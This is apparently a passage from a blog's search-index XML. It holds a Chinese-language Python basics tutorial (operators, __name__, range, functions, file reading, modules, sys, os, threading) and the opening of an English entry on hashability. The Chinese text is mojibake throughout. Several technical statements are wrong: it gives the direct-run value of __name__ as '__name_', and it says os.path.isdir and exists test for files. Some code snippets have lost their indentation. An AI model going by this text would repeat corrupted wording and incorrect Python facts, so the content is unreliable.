sequence</p><p><code>not in</code>ï¼š True if value/variable is not found in thesequence</p><p>ä½œç”¨ï¼š</p><ol type="1"><li><p>æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦åœ¨ä¸€ä¸ªåºåˆ—ï¼ˆlistï¼Œrangeï¼Œstringetc.ï¼‰ä¸­å‡ºç°ï¼Œå¦‚æœåŒ…å«ï¼Œå°±è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</p></li><li><p>é€šè¿‡ for å¾ªç¯çš„åºåˆ—è¿›è¡Œè¿­ä»£</p></li></ol><h1 id="name-å±æ€§"><strong>name</strong> å±æ€§</h1><ul><li>æ¯ä¸€ä¸ªåç¼€ä¸º .py çš„æ–‡ä»¶éƒ½è¢«è§†ä¸ºä¸€ä¸ª Python æ¨¡å—ï¼Œå¯ä»¥è¢«å…¶ä»– Pythonç¨‹åºè°ƒç”¨ã€‚</li><li>æ¯ä¸€ä¸ª Python è„šæœ¬åœ¨è¿è¡Œæ—¶ï¼Œéƒ½æœ‰ä¸€ä¸ª<code>__name_</code>å±æ€§ï¼Œé€šè¿‡å®ƒå¯ä»¥è¯†åˆ«ç¨‹åºçš„ä½¿ç”¨æ–¹å¼ï¼Œå³ï¼šç¨‹åºæ˜¯åœ¨ä½œä¸ºæ¨¡å—è¢«å¯¼å…¥ï¼Œè¿˜æ˜¯åœ¨ç‹¬ç«‹è¿è¡Œã€‚</li><li>å¦‚æœç¨‹åºæ˜¯åœ¨ä½œä¸ºæ¨¡å—è¢«å¯¼å…¥ï¼Œé‚£ä¹ˆ <code>__name_</code>å±æ€§çš„å€¼å°±è‡ªåŠ¨è®¾ç½®ä¸ºæ¨¡å—åï¼Œå¦‚æœè„šæœ¬æ˜¯åœ¨ç‹¬ç«‹è¿è¡Œï¼Œé‚£ä¹ˆ<code>__name_</code> å±æ€§çš„å€¼ä¼šè¢«è‡ªåŠ¨è®¾ç½®ä¸ºå­—ç¬¦ä¸² â€œ<code>__name_</code>â€</li></ul><h1 id="å¾ªç¯">å¾ªç¯</h1><p>åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œæœ‰ä¸‰ç§æµç¨‹æ–¹å¼ï¼šé¡ºåºã€åˆ†æ”¯ã€å¾ªç¯ã€‚</p><h2 id="for-å¾ªç¯">for å¾ªç¯</h2><p>é€šè¿‡ range() ç”Ÿæˆè¿ç»­æ•°åˆ—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>range<em>(start, stop, step</em>)</p><table><colgroup><col style="width: 10%" /><col style="width: 89%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><em>start</em></td><td style="text-align: left;">Optional. An integer number specifying atwhich position to start. Default is 0</td></tr><tr class="even"><td style="text-align: left;"><em>stop</em></td><td style="text-align: left;">Required. An integer number specifying atwhich position to end.</td></tr><tr class="odd"><td style="text-align: left;"><em>step</em></td><td style="text-align: left;">Optional. An integer number specifying theincrementation. Default is 1</td></tr></tbody></table><p>çŸ¥è¯†ç‚¹ï¼š</p><ol type="1"><li>range çš„ step å‚æ•°</li><li>åˆ‡ç‰‡è¶…å‡ºèŒƒå›´ä¸æŠ¥é”™</li></ol><h3 id="range-é€†åº">range é€†åº</h3><ol type="1"><li><p><code>range(5, -1, -1)</code> -- æ­£ç¡®ï¼Œé«˜æ•ˆ It may be lessintuitive but as the comments mention, this is more efficient and theright usage of range for reversed list.</p></li><li><p><code>reversed(range(10))</code> -- æœ€ç›´æ¥å¦‚æœæƒ³è¦å°†å…¶å˜ä¸ºåˆ—è¡¨çš„è¯ï¼Œè¿›è¡Œä¸€ä¸‹å¼ºåˆ¶ç±»å‹è½¬æ¢å³å¯<code>list(reversed(range(10))</code></p></li><li><p><code>range(6)[::-1]</code> åˆ‡ç‰‡é€†åº</p></li></ol><h1 id="å‡½æ•°">å‡½æ•°</h1><ol type="1"><li><code>def</code> æ˜¯è‹±æ–‡ <code>define</code> çš„ç¼©å†™</li><li><strong>å‡½æ•°åç§°</strong>åº”è¯¥èƒ½è¡¨è¾¾<strong>å‡½æ•°å°è£…ä»£ç </strong>çš„åŠŸèƒ½ï¼Œæ–¹ä¾¿åç»­è°ƒç”¨<ul><li>å¯ä»¥ç”±<strong>å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿</strong>ç»„æˆ</li><li><strong>ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</strong></li><li><strong>ä¸èƒ½ä¸å…³é”®å­—é‡å¤</strong></li></ul></li></ol><p>æ³¨æ„: ä¸èƒ½å°†å‡½æ•°è°ƒç”¨æ”¾åœ¨å‡½æ•°å®šä¹‰çš„ä¸Šæ–¹ï¼Œå¦åˆ™æ§åˆ¶å°ä¼šæç¤º<code>NameError: name "xxx" is not defined</code>å› ä¸ºåœ¨ä½¿ç”¨å‡½æ•°åè°ƒç”¨å‡½æ•°ä¹‹å‰ï¼Œå¿…é¡»è¦ä¿è¯ <code>Python</code>å·²ç»çŸ¥é“å‡½æ•°çš„å­˜åœ¨ã€‚</p><h2 id="å‡½æ•°æ³¨é‡Š">å‡½æ•°æ³¨é‡Š</h2><p>åœ¨å‡½æ•°ä¸‹æ–¹ä½¿ç”¨å¤šè¡Œæ³¨é‡Šï¼ˆä¸‰ä¸ªå¼•å·ï¼‰ æ¥è¿›è¡Œæ³¨é‡Šã€‚</p><p>æ³¨æ„ï¼šæ ¹æ® Python å®˜æ–¹ä»£ç æ ¼å¼è¦æ±‚ï¼ˆPEP8ï¼‰:å› ä¸ºå‡½æ•°ä½“ç›¸å¯¹æ¯”è¾ƒç‹¬ç«‹ï¼Œå‡½æ•°å®šä¹‰çš„ä¸Šæ–¹ï¼Œåº”è¯¥å’Œå…¶ä»–ä»£ç  ( åŒ…æ‹¬æ³¨é‡Š )ä¿ç•™ä¸¤ä¸ªç©ºè¡Œã€‚</p><p>æŠ€å·§ï¼šPyCharm ä¸­å°†é¼ æ ‡æ”¾åˆ°å‡½æ•°å®šä¹‰çš„åå­—é‚£é‡Œï¼Œç„¶åå‡ºç°æç¤ºï¼Œæˆ‘ä»¬<code>insert documentation stirng stub</code>,æ ¼å¼å¦‚ä¸‹ï¼Œç„¶åå½“æˆ‘ä»¬æŠŠå…‰æ ‡æ”¾åˆ°ä½¿ç”¨å‡½æ•°çš„åœ°æ–¹ï¼ˆå‡½æ•°åï¼‰ï¼Œç„¶åæŒ‰ Ctrl+Qå¿«æ·æŸ¥çœ‹å‡½æ•°ä¿¡æ¯ã€‚æœ€ååœ¨ Pycharm ç©ºç™½åŒºåŸŸç‚¹å‡»ä¸€ä¸‹ï¼Œä¾¿é€€å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url, img_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸‹è½½å›¾ç‰‡ï¼Œå¹¶å†™å…¥åˆ°æŒ‡å®šä½ç½®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param url: å›¾ç‰‡çš„ url</span></span><br><span class="line"><span class="string">    :param img_dir: è¦å†™å…¥çš„å›¾ç‰‡ç›®å½•</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°è¿”å›å€¼">å‡½æ•°è¿”å›å€¼</h2><ul><li>å¯¹äºé€»è¾‘è¿ç®—ï¼Œæœ€ç»ˆå°†å¸ƒå°”å€¼è¿”å›çš„æƒ…å†µï¼Œä¸å»ºè®®ä½¿ç”¨ä¸‹é¢å†™æ³•ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢çš„å†™æ³•æ›´å¥½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line"><span class="keyword">return</span> condition</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼šåˆ¤æ–­é—°å¹´çš„ä¾‹å­</p><p>æç¤ºï¼šå·¥ä½œä¸­é’ˆå¯¹éœ€æ±‚çš„å˜åŒ–ï¼Œåº”è¯¥å†·é™æ€è€ƒï¼Œä¸è¦è½»æ˜“ä¿®æ”¹ä¹‹å‰å·²ç»å®Œæˆçš„èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œçš„å‡½æ•°ã€‚</p><h1 id="æ–‡ä»¶æ“ä½œ">æ–‡ä»¶æ“ä½œ</h1><h2 id="æ­¥éª¤">æ­¥éª¤</h2><ol type="1"><li>é€šè¿‡ open() å‡½æ•°æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª File å¯¹è±¡</li><li>è°ƒç”¨ File å¯¹è±¡çš„ read() æˆ– write()ç­‰æ–¹æ³•ï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¯»å†™æ“ä½œ</li><li>è°ƒç”¨ File å¯¹è±¡çš„ close() æ–¹æ³•ï¼Œå…³é—­å¹¶ä¿å­˜æ–‡ä»¶å†…å®¹</li></ol><p>æ–‡ä»¶çš„æ‰“å¼€æ¨¡å¼ä¸»è¦åŒ…æ‹¬ï¼š</p><ol type="1"><li><p>r åªè¯»æ¨¡å¼ï¼ˆé»˜è®¤ï¼‰</p></li><li><p>wåªå†™æ¨¡å¼ï¼ˆå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™å…ˆæ¸…ç©ºåŸæœ‰å†…å®¹ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–‡ä»¶ï¼‰</p></li><li><p>a è¿½åŠ æ¨¡å¼ï¼ˆä¸è¦†ç›–æ–‡ä»¶ä¸­åŸæœ‰å†…å®¹ï¼‰</p></li></ol><p>å¦‚æœä¼ é€’ç»™ open()çš„æ–‡ä»¶åä¸å­˜åœ¨ï¼Œå†™æ¨¡å¼å’Œè¿½åŠ æ¨¡å¼éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºæ–‡ä»¶ã€‚</p><h2 id="è¯»å–çš„æ–¹æ³•">è¯»å–çš„æ–¹æ³•</h2><ol type="1"><li><p>read()å°†æ‰€æœ‰å†…å®¹è¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ã€‚å¯ä»¥åŠ å‚æ•°ï¼ŒæŒ‡å®šè¦è¯»å¤šå°‘ä¸ªå­—ç¬¦</p></li><li><p>readline() ä¸€è¡Œä¸€è¡Œè¯»å–ï¼ŒåŒ…æ‹¬ </p></li><li><p>readlines(ï¼‰å°†æ‰€æœ‰å†…å®¹ï¼ŒæŒ‰ç…§è¡Œï¼Œåˆ†åˆ°åˆ—è¡¨ä¸­</p></li><li><p>seek(arg) å®šä½æŒ‡é’ˆ</p><p>seek(0ï¼‰ å°†æ–‡ä»¶æµæŒ‡é’ˆå®šä½åˆ°æ–‡ä»¶é¦–ã€‚</p></li></ol><p>å¸¸ç”¨è¯»å–æ–¹æ³•ï¼š</p><ol type="1"><li>for å¾ªç¯ä¸ readlines è¿­ä»£</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=open(&#x27;ip.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for i in f.readlines():</span><br><span class="line">print(i,end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¯»å–çš„æ–‡ä»¶æ¯è¡Œæœ«å°¾æœ‰ ï¼Œè€Œ printæ‰“å°çš„æ—¶å€™ï¼Œé»˜è®¤åˆä¼šæ‰“å°ä¸€ä¸ªã€‚æ‰€ä»¥<strong>æœ€å¥½çš„æ–¹æ³•æ˜¯è®© print ä¸æ‰“å°ã€‚</strong></p><p>æˆ–è€…é€šè¿‡å­—ç¬¦ä¸²çš„ strip() æ–¹æ³•ï¼ˆé»˜è®¤å»æ‰ whitespaceï¼ŒåŒ…æ‹¬ï¼Œç©ºæ ¼ï¼‰å°†æ–‡ä»¶ä¸­æ¯ä¸€è¡Œæœ«å°¾çš„ ï¼ˆLinuxï¼‰æˆ– ï¼ˆWindowsï¼‰å»é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=open(&#x27;ip.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for i in f.readlines():</span><br><span class="line">print(i.strip())</span><br></pre></td></tr></table></figure><h1 id="æ¨¡å—">æ¨¡å—</h1><p>æ¨¡å—æ˜¯ Python ç¨‹åºæ¶æ„çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚</p><h2 id="æ¦‚å¿µ">æ¦‚å¿µ</h2><ul><li><p>æ¨¡å—ä¹Ÿå«åº“ï¼Œæ¯ä¸ªæ¨¡å—ä¸­éƒ½å†…ç½®äº†å¤§é‡çš„åŠŸèƒ½å‡½æ•°ã€ç±»å’Œå˜é‡ã€‚å®ƒå°±åƒæ˜¯ç§¯æœ¨ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œè°ƒç”¨ç»„åˆã€‚</p></li><li><p>æ¨¡å—å°±æ˜¯ç¨‹åºï¼Œæ¯ä¸ªæ¨¡å—å°±æ˜¯ä¸€ä¸ªåçº§ä¸º .py çš„ Pythonç¨‹åºã€‚</p></li><li><p>Python çš„æ¨¡å—åˆ†ä¸ºæ ‡å‡†æ¨¡å—å’Œç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œæ ‡å‡†æ¨¡å—æ˜¯ Python å†…ç½®çš„ï¼Œç¬¬ä¸‰æ–¹æ¨¡å—åˆ™éœ€è¦å®‰è£…ä¹‹åæ‰èƒ½ä½¿ç”¨ã€‚</p></li><li><p>æ¨¡å—ä¸­å®šä¹‰çš„ <code>å…¨å±€å˜é‡</code>ã€<code>å‡½æ•°</code>éƒ½æ˜¯æ¨¡å—èƒ½å¤Ÿæä¾›ç»™å¤–ç•Œç›´æ¥ä½¿ç”¨çš„å·¥å…·</p></li><li><p>å¯ä»¥é€šè¿‡ help å‘½ä»¤äº†è§£ä¸€ä¸ªæ¨¡å—çš„åŸºæœ¬å¸®åŠ©ä¿¡æ¯ï¼Œå¦‚:helpï¼ˆ'sys'ï¼‰</p></li><li><p><strong>æ¨¡å—åä¹Ÿæ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦</strong>ï¼Œå³: å¦‚æœä½ çš„ Pyæ–‡ä»¶æƒ³è¦å¯ä»¥å½“ä½œæ¨¡å—è¢«ä½¿ç”¨ï¼Œå…¶å‘½åå°±è¦éµå¾ªæ ‡è¯†ç¬¦çš„å‘½åè§„åˆ™ã€‚</p></li></ul><h2 id="pyc-æ–‡ä»¶">Pyc æ–‡ä»¶</h2><blockquote><p>c æ˜¯ compiled çš„æ„æ€</p></blockquote><p>å½“æˆ‘ä»¬åœ¨å¯¼å…¥è‡ªå·±å†™å…¥çš„æ¨¡å—ï¼Œå¹¶è¿è¡Œåï¼Œå‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº†<code>__pycache__</code>çš„ç›®å½•ï¼Œå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬å¯¼å…¥çš„æ¨¡å—è¢«è§£é‡Šåç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶<code>.pyc</code>ï¼Œç”¨æ¥åŠ å¿«é€Ÿåº¦ï¼ˆä¸ç”¨æ¯æ¬¡éƒ½è§£é‡Šï¼Œå› ä¸ºæ¨¡å—æ˜¯ç›¸å¯¹å›ºå®šï¼Œä¸ä¿®æ”¹ç»å¸¸ä¿®æ”¹çš„ï¼‰</p><ul><li>è¿™ä¸ª <code>pyc</code> æ–‡ä»¶æ˜¯ç”± pythonè§£é‡Šå™¨å°†æ¨¡å—çš„æºç è½¬æ¢ä¸º<code>å­—èŠ‚ç </code>ï¼Œ python è¿™æ ·ä¿å­˜<code>å­—èŠ‚ç </code>æ˜¯ä½œä¸ºä¸€ç§å¯åŠ¨é€Ÿåº¦çš„ä¼˜åŒ–ã€‚</li></ul><p>å­—èŠ‚ç  python åœ¨è§£é‡Šæºç¨‹åºæ—¶ï¼Œåˆ†ä¸¤æ­¥ï¼š</p><ol type="1"><li>å¤„ç†æºç ï¼Œè§£é‡Šç”Ÿæˆå­—èŠ‚ç </li><li>å¯¹å­—èŠ‚ç è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆ CPU èƒ½å¤Ÿè¯†åˆ«çš„æœºå™¨ç ã€‚</li></ol><ul><li>æœ‰äº†æ¨¡å—çš„å­—èŠ‚ç ä¹‹åï¼Œä¸‹æ¬¡è¿è¡Œç¨‹åºï¼Œå¦‚æœåœ¨ä¸Šæ¬¡ä¿å­˜å­—èŠ‚ç ä¹‹åï¼Œæ²¡æœ‰ä¿®æ”¹è¿‡æºä»£ç ï¼ŒPython å°†ä¼šåŠ è½½ .pyc æ–‡ä»¶ï¼Œå¹¶è·³è¿‡ç¼–è¯‘è¿™ä¸ªæ­¥éª¤ã€‚</li><li>å½“ python é‡ç¼–è¯‘æ—¶ï¼Œ å®ƒä¼šè‡ªåŠ¨æ£€æŸ¥æºæ–‡ä»¶å’Œå­—èŠ‚ç æ–‡ä»¶çš„æ—¶é—´æˆ³</li><li>å¦‚æœä½ åˆä¿®æ”¹äº†æºä»£ç ï¼Œä¸‹æ¬¡ç¨‹åºè¿è¡Œæ—¶ï¼Œå­—èŠ‚ç å°†è‡ªåŠ¨é‡æ–°åˆ›å»ºã€‚</li></ul><h2 id="å¯¼å…¥">å¯¼å…¥</h2><ul><li><p>æ— è®ºæ˜¯æ ‡å‡†æ¨¡å—ï¼Œè¿˜æ˜¯ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œéƒ½éœ€è¦å…ˆå¯¼å…¥ä¹‹åï¼Œæ‰å¯ä»¥ä½¿ç”¨</p></li><li><p>åœ¨ç¨‹åºä¸­åº”åªå¯¼å…¥å¿…é¡»çš„æ¨¡å—ï¼Œä»¥å‡å°‘è¿è¡Œå‹åŠ›</p></li><li><p>å¯¼å…¥æ–¹æ³•</p><ul><li>ç›´æ¥å¯¼å…¥æ¨¡å— <code>import module_name</code></li><li>ä»æ¨¡å—ä¸­å¯¼å…¥æŸä¸ªå‡½æ•°ï¼š<code>from module_name import function_name</code></li></ul></li><li><p>ä¸¤ç§å¯¼å…¥å…¨éƒ¨æ–¹æ³•çš„æ–¹å¼</p><ul><li>import os åº”é‡‡ç”¨ â€œæ¨¡å—å.æ–¹æ³•åâ€çš„å½¢å¼ä½¿ç”¨æ¨¡å—ä¸­çš„æ–¹æ³•ï¼Œå¦‚ï¼šos.system()</li><li>import os from * å¯ä»¥ç›´æ¥ä½¿ç”¨æ–¹æ³•å, å¦‚ï¼šsystem()æ–¹æ³•ï¼Œæ— éœ€åŠ ä¸Šæ¨¡å—åä½œä¸ºå‰ç¼€ã€‚</li></ul></li></ul><h2 id="å¸¸ç”¨æ¨¡å—">å¸¸ç”¨æ¨¡å—</h2><h3 id="sys-æ¨¡å—">sys æ¨¡å—</h3><h4 id="sys.argv">sys.argv()</h4><p>sys.argv æ˜¯ä¸€ä¸ªåˆ—è¡¨å˜é‡ï¼Œä¸“é—¨ç”¨æ¥å‘ Python è§£é‡Šå™¨ä¼ é€’å‚æ•°ï¼Œç±»ä¼¼ Shellè„šæœ¬ç¼–ç¨‹ä¸­çš„ä½ç½®å˜é‡</p><p>è„šæœ¬æ–‡ä»¶å sys.argv[0]</p><p>ç”¨æˆ·è¾“å…¥çš„å‚æ•°çš„æ•°é‡ len(sys.argv) -1</p><p>æ‰€æœ‰å‚æ•° str(sys.argv)</p><p>ç¬¬ä¸€ä¸ªå‚æ•° sys.argv[1]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è„šæœ¬æ–‡ä»¶å:d:/pyworkspace/banner.py</span><br><span class="line">ç”¨æˆ·è¾“å…¥çš„å‚æ•°çš„æ•°é‡ï¼š<span class="number">1</span></span><br><span class="line">æ‰€æœ‰å‚æ•°ï¼š[<span class="string">&#x27;d:/pyworkspace/banner.py&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šhello</span><br></pre></td></tr></table></figure><h4 id="sys.exit">sys.exit()</h4><ul><li>sys.exit() æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œä½œç”¨æ˜¯æ¨å‡ºå½“å‰ç¨‹åº</li><li>sys.exit() é€€å‡ºå½“å‰ç¨‹åºï¼Œå¹¶è¿”å› SystemExit å¼‚å¸¸</li><li>sys.exit(0) æ­£å¸¸é€€å‡º</li><li>sys.exit('ç¨‹åºé€€å‡ºâ€˜) ï¼Œ é€€å‡ºæ—¶ï¼Œæ˜¾ç¤ºä¸€æ®µæç¤ºä¿¡æ¯</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&#x27;æ­£ç¡®ä½¿ç”¨æ–¹æ³•ï¼š<span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> IPåˆ—è¡¨æ–‡ä»¶&#x27;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;ä¾‹å¦‚ï¼šbanner.py ip.txt&#x27;</span>)</span><br><span class="line">      sys.exit()</span><br><span class="line">  filename=<span class="built_in">str</span>(sys.argv[<span class="number">1</span>].strip())</span><br></pre></td></tr></table></figure><h3 id="os-æ¨¡å—">os æ¨¡å—</h3><ul><li><p>os æ¨¡å—æä¾›äº†è®¿é—®æ“ä½œç³»ç»ŸæœåŠ¡çš„åŠŸèƒ½</p></li><li><p>å®ƒæœ€å¸¸ç”¨çš„æ˜¯ os.system() æ–¹æ³•ï¼Œå¯ä»¥åœ¨ Pythonä¸­ä½¿ç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(cls)</span><br></pre></td></tr></table></figure><p>os.path.isfile() æ–¹æ³•ï¼Œåˆ¤æ–­æŒ‡å®šçš„å¯¹è±¡æ˜¯å¦ä¸ºæ–‡ä»¶ï¼Œè¿”å› True æˆ–False</p><p>os.path.isdir() æ–¹æ³•ï¼Œåˆ¤æ–­æŒ‡å®šçš„å¯¹è±¡æ˜¯å¦ä¸ºæ–‡ä»¶ï¼Œè¿”å› True æˆ–False</p><p>os.path.exists() æ–¹æ³•ï¼Œåˆ¤æ–­æŒ‡å®šçš„å¯¹è±¡æ˜¯å¦ä¸ºæ–‡ä»¶ï¼Œè¿”å› True æˆ–False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isfile(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isdir(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.exists(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="å¤šçº¿ç¨‹">å¤šçº¿ç¨‹</h1><p>é€šå¸¸é€šè¿‡å¤šçº¿ç¨‹çš„æ–¹å¼æ¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œä»è€Œä½¿å¾—è¯¥å‡½æ•°ä¸­çš„ä»£ç å¯ä»¥å¹¶å‘æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = threading.Thread(target=è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œargs=(å‘å‡½æ•°ä¼ é€’çš„å‚æ•°))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>å› ä¸º argsæ˜¯å…ƒç»„ï¼Œæ‰€ä»¥å¦‚æœå…ƒç»„ä¸­åªæœ‰ä¸€ä¸ªå€¼çš„è¯ï¼Œè¦åœ¨å€¼åé¢åŠ é€—å·ï¼Œæ¥æŒ‡æ˜å®ƒæ˜¯å…ƒç»„ã€‚</p><p>ä¸€èˆ¬åªæ˜¯ç”¨ Threading ä¸­çš„ Threadç±»ï¼Œæ‰€ä»¥å¾ˆå¤šè„šæœ¬éƒ½æ˜¯ä½¿ç”¨ä¸‹é¢è¯­å¥å¯¼å…¥çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br></pre></td></tr></table></figure><h1 id="optparse-æ¨¡å—">optparse æ¨¡å—</h1><ul><li>åˆ©ç”¨è¯¥æ¨¡å—å¯ä»¥è®¾ç½®é€‰é¡¹ï¼Œ</li></ul><h1 id="æ‰©å±•">æ‰©å±•</h1><p>å¼•å…¥ stderr æ˜¯å› ä¸ºï¼š</p><p>1.æ“ä½œå‘˜å¸Œæœ›åœ¨å±å¹•ä¸Šçœ‹åˆ°ç¨‹åºçš„è¿è¡Œè¿›åº¦ï¼Œä½†æ˜¯ä¸å¸Œæœ›çœ‹åˆ°è¯Šæ–­ä¿¡æ¯ã€‚2.å½“æœ‰äººæƒ³é‡å®šå‘è¯Šæ–­ä¿¡æ¯æ—¶ï¼Œæ‚²å‰§å‘ç”Ÿäº†ï¼Œæ­£å¸¸è¾“å‡ºä¹Ÿè¢«é‡å®šå‘äº†ï¼Œç¨‹åºçš„è¿è¡Œå¼€å§‹å˜å¾—ä¸å¯é¢„æœŸã€‚3.è™½ç„¶å¼•å…¥çš„ç³»ç»Ÿçº§æ ‡å‡†é”™è¯¯æ–‡ä»¶ï¼Œä½†ä¾ç„¶å­˜åœ¨å¤šä¸ªç¨‹åºåŒæ—¶è¾“å‡ºè¯Šæ–­ä¿¡æ¯çš„é—®é¢˜ã€‚</p><p>å¾ˆè‡ªç„¶çš„ï¼Œä¸€ä¸ªè¿›ç¨‹ç‹¬å ï¼Œè¯Šæ–­ä¿¡æ¯åˆ†ç¦»çš„è¾“å‡ºæµ stderr å°±å‡ºç° èŠ‚é€‰è‡ª<ahref="https://zhuanlan.zhihu.com/p/29613516">ä½•æ—¶ä½¿ç”¨ STDERRï¼Ÿ -çŸ¥ä¹</a></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><p><ahref="https://www.programiz.com/python-programming/operators">PythonOperators</a> &gt; <ahref="https://stackoverflow.com/questions/7286365/print-a-list-in-reverse-order-with-range">Printa list in reverse order with range()?</a> &gt; <ahref="https://blog.csdn.net/linian71/article/details/78712485">Pythonrange é€†åºè¿­ä»£</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hashability in Python</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/13.hashability/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/13.hashability/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><blockquote><p>hashable</p><p>An object is hashable if it has a hash value which never changesduring its lifetime (it needs a <code>__hash__()</code> method), and canbe compared to other objects (it needs an <code>__eq__()</code> method).Hashable objects which compare equal must have the same hash value.</p><p>Hashability makes an object usable as a <strong>dictionary key and aset</strong> member, because these data structures use the hash valueinternally.</p><p>Most of Pythonâ€™s immutable built-in objects are hashable; mutablecontainers (such as lists or dictionaries) are not; <strong>immutablecontainers (such as tuples and frozensets) are only hashable if theirelements are hashable</strong>. Objects which are instances of<strong>user-defined classes are hashable by default</strong>. They allcompare unequal (except with 